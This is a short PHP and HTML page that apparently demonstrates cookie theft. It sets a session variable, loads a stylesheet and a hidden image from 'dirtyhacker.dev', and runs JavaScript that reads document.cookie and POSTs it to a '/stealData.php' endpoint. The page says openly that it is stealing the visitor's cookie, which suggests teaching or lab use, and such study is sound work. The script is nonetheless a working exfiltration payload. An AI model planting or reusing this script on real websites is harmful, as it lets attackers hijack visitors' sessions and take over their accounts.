<?php

session_start();
$_SESSION['username'] = 'dave';
?>
<!DOCTYPE html>
<html>
<head>
    <title>A bad man is stealing your data!</title>
    <link rel="stylesheet" type="text/css" href="http://dirtyhacker.dev/insecure.css">
</head>
<body>
<img src='http://dirtyhacker.dev/brokenimg.png' style='display:none;' />
Sending your cookie off to a bad website.

<script type="text/javascript">
var yourCookie = document.cookie,
    request = new XMLHttpRequest(),
    post = new FormData();
post.append("cookie", yourCookie);
request.open("POST", window.location.origin + "/stealData.php");
request.send(post);
</script>



</body>
</html>
